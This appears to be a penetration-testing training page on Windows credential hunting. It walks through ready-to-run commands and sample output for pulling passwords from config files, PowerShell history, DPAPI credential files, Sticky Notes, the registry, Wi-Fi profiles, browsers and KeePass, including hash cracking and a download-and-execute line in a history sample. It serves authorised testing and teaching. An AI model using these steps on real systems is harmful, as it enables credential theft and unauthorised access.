# Credential Hunting

## Application Configuration Files

### Searching for Files

Against best practices, applications often store passwords in cleartext config files. Suppose we gain command execution in the context of an unprivileged user account. In that case, we may be able to find credentials for their admin account or another privileged local or domain account. We can use the [findstr](https://ss64.com/nt/findstr.html) utility to search for this sensitive information.

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

Sensitive IIS information such as credentials may be stored in a `web.config` file. For the default IIS website, this could be located at `C:\inetpub\wwwroot\web.config`, but there may be multiple versions of this file in different locations, which we can search for recursively.

***

## Dictionary Files

### Chrome Dictionary Files

Another interesting case is dictionary files. For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline.

```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

***

## Unattended Installation Files

Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.

### Unattend.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.

***

## PowerShell History File

Starting with PowerShell 5.0 in Windows 10, PowerShell stores command history to the file:

`C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

### Confirming PowerShell History Save Path

As seen in the Windows Commands PDF, published by Microsoft [here](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf), there are many commands which can pass credentials on the command line. We can see in the example below that the user-specified local administrative credentials to query the Application Event Log using [wevutil](https://ss64.com/nt/wevtutil.html).

{% code title="Command" %}
```powershell
(Get-PSReadLineOption).HistorySavePath
```
{% endcode %}

{% code title="Output" %}
```
C:\Users\Gary\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
{% endcode %}

### Reading PowerShell History File

Once we know the file's location (the default path is above), we can attempt to read its contents using `gc`.

{% code title="Command" %}
```powershell
gc (Get-PSReadLineOption).HistorySavePath
```
{% endcode %}

{% code title="Output" %}
```powershell-session
dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))
. .\Get-IISsite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02
```
{% endcode %}

We can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user. This can also be extremely helpful as a post-exploitation step. We should always recheck these files once we have local admin if our prior access did not allow us to read the files for some users. This command assumes that the default save path is being used.

{% code title="Command" overflow="wrap" %}
```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
{% endcode %}

{% code title="Output" %}
```powershell-session
dir
cd Temp
md backups
cp c:\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))
. .\Get-IISsite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02\administrator /p:5erv3rAdmin! /r:WEB02
```
{% endcode %}

***

## PowerShell Credentials

PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on.

Take, for example, the following script `Connect-VC.ps1`, which a sysadmin has created to connect to a vCenter server easily.

```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

### Decrypting PowerShell Credentials

If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`. The example below assumes the former.

```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

bob

PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```

***

## Manually Searching the File System for Credentials

We can search the file system or share drive(s) manually using the following commands from [this cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/).

### Searching File Contents for Strings

```cmd-session
C:\> cd c:\Users\Greg\Documents & findstr /SI /M "password" *.xml *.ini *.txt

stuff.txt
```

```cmd-session
C:\> findstr /si password *.xml *.ini *.txt *.config

stuff.txt:password: l#-x9r11_2_GL!
```

```cmd-session
C:\> findstr /spin "password" *.*

stuff.txt:1:password: l#-x9r11_2_GL!
```

### Search File Contents with PowerShell

We can also search using PowerShell in a variety of ways.

```powershell
PS C:\> select-string -Path C:\Users\Greg\Documents\*.txt -Pattern password

stuff.txt:1:password: l#-x9r11_2_GL!
```

### Search for File Extensions

```cmd-session
C:\> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

c:\inetpub\wwwroot\web.config
```

```cmd-session
C:\> where /R C:\ *.config

c:\inetpub\wwwroot\web.config
```

### Search for File Extensions Using PowerShell

```powershell
PS C:\> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore


    Directory: C:\inetpub\wwwroot


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021   9:59 AM            329 web.config

<SNIP>
```

***

## Sticky Notes Passwords

People often use the StickyNotes app on Windows workstations to save passwords and other information, not realising it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### Looking for StickyNotes DB Files

```powershell-session
PS C:\> ls
 
 
    Directory: C:\Users\Greg\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
 
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  11:59 AM           4096 plum.sqlite
-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal
```

We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query

```sql
SELECT Text FROM Note;
```

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

### Viewing Sticky Notes Data Using PowerShell

This can also be done with PowerShell using the [PSSQLite module](https://github.com/RamblingCookieMonster/PSSQLite). First, import the module, point to a data source (in this case, the SQLite database file used by the StickNotes app), and finally query the `Note` table and look for any interesting data. This can also be done from our attack machine after downloading the `.sqlite` file or remotely via WinRM.

```powershell
PS C:\> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\> cd .\PSSQLite\
PS C:\> Import-Module .\PSSQLite.psd1
PS C:\> $db = 'C:\Users\Greg\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
 
Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
\id=e4adae4c-a40b-48b4-93a5-900247852f96
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am
```

### Using Strings to View DB File Contents

We can also copy them over to our attack box and search through the data using the `strings` command, which may be less efficient depending on the size of the database.

```shellsession
clue@machine[~]$  strings plum.sqlite-wal

CREATE TABLE "Note" (
"Text" varchar ,
"WindowPosition" varchar ,
"IsOpen" integer ,
"IsAlwaysOnTop" integer ,
"CreationNoteIdAnchor" varchar ,
"Theme" varchar ,
"IsFutureNote" integer ,
"RemoteId" varchar ,
"ChangeKey" varchar ,
"LastServerVersion" varchar ,
"RemoteSchemaVersion" integer ,
"IsRemoteDataInvalid" integer ,
"PendingInsightsScan" integer ,
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint )'
indexsqlite_autoindex_Note_1Note
af907b1b-1eef-4d29-b238-3ea74f7ffe5caf907b1b-1eef-4d29-b238-3ea74f7ffe5c
U	af907b1b-1eef-4d29-b238-3ea74f7ffe5c
Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c
U	93b49900-6530-42e0-b35c-2663989ae4b3

< SNIP >

\id=011f29a4-e37f-451d-967e-c42b818473c2 vCenter
\id=34910533-ddcf-4ac4-b8ed-3d1f10be9e61 alright*
\id=ffaea2ff-b4fc-4a14-a431-998dc833208c root:Vc3nt3R_adm1n!ManagedPosition=Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c

<SNIP >
```

***

## Other Files of Interest

### Other Interesting Files

Some other files we may find credentials in include the following:

```shell-session
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

***

## Cmdkey Saved Credentials

### Listing Saved Credentials

The [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password. This may help us either move laterally to another system with a different user or escalate privileges on the current host to leverage stored credentials for another user.

```cmd-session
C:\> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
```

When we attempt to RDP to the host, the saved credentials will be used.

We can also attempt to reuse the credentials using `runas` to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:

### Run Commands as Another User

```powershell
PS C:\> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

***

## Browser Credentials

### Retrieving Saved Credentials from Chrome

Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.

```powershell
PS C:\> .\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.7.0


[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user



[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0


--- Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1
```

{% hint style="warning" %}
#### Event Logging

Credential collection from Chromium-based browsers typically generates additional events that could be logged and identified by the blue team such as `4688` (process creation) and `16385` (DPAPI activity); defenders may also consider filesystem/object access events such as `4662` (object access) and `4663` (file access) to improve detection fidelity.
{% endhint %}

***

## Password Managers

Many companies provide password managers to their users. This may be in the form of a desktop application such as `KeePass`, a cloud-based solution such as `1Password`, or an enterprise password vault such as `Thycotic` or `CyberArk`.

Gaining access to a password manager, especially one utilised by a member of the IT staff or an entire department, may lead to administrator-level access to high-value targets such as network devices, servers, databases, etc. We may gain access to a password vault through password reuse or guessing a weak/common password. Some password managers such as `KeePass` are stored locally on the host. If we find a `.kdbx` file on a server, workstation, or file share, we know we are dealing with a `KeePass` database which is often protected by just a master password. If we can download a `.kdbx` file to our attacking host, we can use a tool such as [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py) to extract the password hash and run it through a password cracking tool such as [hashcat.md](../../../toolbox/tooling/password-attacks/hashcat.md "mention") or [johntheripper](../../../toolbox/tooling/password-attacks/johntheripper/ "mention").

### Extracting KeePass Hash

First, we extract the hash in [hashcat.md](../../../toolbox/tooling/password-attacks/hashcat.md "mention") format using the `keepass2john.py` script.

{% code title="Command" %}
```shellscript
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
```
{% endcode %}

<pre data-title="Output" data-overflow="wrap"><code><strong>ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
</strong></code></pre>

### Cracking Hash Offline

We can then feed the hash to [hashcat.md](../../../toolbox/tooling/password-attacks/hashcat.md "mention"), specifying [hash mode](https://hashcat.net/wiki/doku.php?id=example_hashes) 13400 for KeePass. If successful, we may gain access to a wealth of credentials that can be used to access other applications/systems or even network devices, servers, databases, etc., if we can gain access to a password database used by IT staff.

```bash
clue@machine[~]$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)
Hash.Target......: $keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d...39c154
Time.Started.....: Fri Aug  6 11:17:47 2021 (22 secs)
Time.Estimated...: Fri Aug  6 11:18:09 2021 (0 secs)
Guess.Base.......: File (/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      276 H/s (4.79ms) @ Accel:1024 Loops:16 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59984-60000
Candidates.#1....: 123456 -> iheartyou

Started: Fri Aug  6 11:17:45 2021
Stopped: Fri Aug  6 11:18:11 2021
```

***

## Email

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

***

## Clear-Text Password Storage in the Registry

### Windows AutoLogon

Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password at each startup. However, once this is configured, the username and password are stored in the registry, in clear-text. This feature is commonly used on single-user systems or in situations where convenience outweighs the need for enhanced security.

The registry keys associated with Autologon can be found under `HKEY_LOCAL_MACHINE` in the following hive, and can be accessed by standard users:

```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

The typical configuration of an Autologon account involves the manual setting of the following registry keys:

* `AdminAutoLogon` - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
* `DefaultUserName` - Holds the value of the username of the account that will automatically log on.
* `DefaultPassword` - Holds the value of the password for the user account specified previously.

#### Enumerating Autologon with reg.exe

```cmd-session
C:\>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    <SNIP>
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

{% hint style="info" %}
#### Note

If you absolutely must configure Autologon for your windows system, it is recommended to use Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.
{% endhint %}

### Putty

For Putty sessions utilising a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.

```cmd
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

Note that the access controls for this specific registry key are tied to the user account that configured and saved the session. Therefore, in order to see it, we would need to be logged in as that user and search the `HKEY_CURRENT_USER` hive. Subsequently, if we had admin privileges, we would be able to find it under the corresponding user's hive in `HKEY_USERS`.

#### Enumerating Sessions and Finding Credentials:

First, we need to enumerate the available saved sessions:

```powershell
PS C:\> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

Next, we look at the keys and values of the discovered session "`kali%20ssh`":

```powershell
PS C:\> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  <SNIP>
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!    
```

In this example, we can imagine the scenario that the IT administrator has configured Putty for a user in their environment, but unfortunately used their admin credentials in the proxy connection. The password could be extracted and potentially reused across the network.

For additional information on `reg.exe` and working with the registry, be sure to check out the [Introduction to Windows Command Line](https://academy.hackthebox.com/module/167/section/1623) module.

***

## Wifi Passwords

### Viewing Saved Wireless Networks

If we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to.

```cmd-session
C:\> netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : Smith Cabin
    All User Profile     : Bob's iPhone
    All User Profile     : EE_Guest
    All User Profile     : EE_Guest 2.4
    All User Profile     : ilfreight_corp
```

### Retrieving Saved Wireless Passwords

Depending on the network configuration, we can retrieve the pre-shared key (`Key Content` below) and potentially access the target network. While rare, we may encounter this during an engagement and use this access to jump onto a separate wireless network and gain access to additional resources.

```cmd-session
C:\> netsh wlan show profile ilfreight_corp key=clear

Profile ilfreight_corp on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : ilfreight_corp
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "ilfreight_corp"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : ILFREIGHTWIFI-CORP123908!

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default
```

***

## Automated Credential Hunting

When all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZagne) tool in an attempt to retrieve credentials from a wide variety of software. Such software includes web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.). The tool can be used to run all modules, specific modules (such as databases), or against a particular piece of software (i.e., OpenVPN). The output can be saved to a standard text file or in JSON format. Let's take it for a spin.

### Running All LaZagne Modules

As we can see, there are many modules available to us. Running the tool with `all` will search for supported applications and return any discovered cleartext credentials. As we can see from the example below, many applications do not store credentials securely (best never to store credentials, period!). They can easily be retrieved and used to escalate privileges locally, move on to another system, or access sensitive data.

```powershell
PS C:\> .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Credman passwords -----------------

[+] Password found !!!
URL: dev01.dev.inlanefreight.local
Login: jordan_adm
Password: ! Q A Z z a q 1

[+] 2 passwords have been found.

For more information launch it again with the -v option

elapsed time = 5.50499987602
```

### Running SessionGopher

We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. It can be run locally or remotely.

It searches the `HKEY_USERS` hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find. It can also be run to search drives for PuTTY private key files (.ppk), Remote Desktop (.rdp), and RSA (.sdtid) files.

We need local admin access to retrieve stored session information for every user in `HKEY_USERS`, but it is always worth running as our current user to see if we can find any useful credentials.

```powershell
PS C:\> Import-Module .\SessionGopher.ps1
 
PS C:\> Invoke-SessionGopher -Target WINLPE-SRV01
 
          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com
 
[+] Digging on WINLPE-SRV01...
WinSCP Sessions
 
 
Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings
Hostname :
Username :
Password :
 
 
PuTTY Sessions
 
 
Source   : WINLPE-SRV01\htb-student
Session  : nix03
Hostname : nix03.inlanefreight.local
 

 
SuperPuTTY Sessions
 
 
Source        : WINLPE-SRV01\htb-student
SessionId     : NIX03
SessionName   : NIX03
Host          : nix03.inlanefreight.local
Username      : srvadmin
ExtraArgs     :
Port          : 22
Putty Session : Default Settings
```
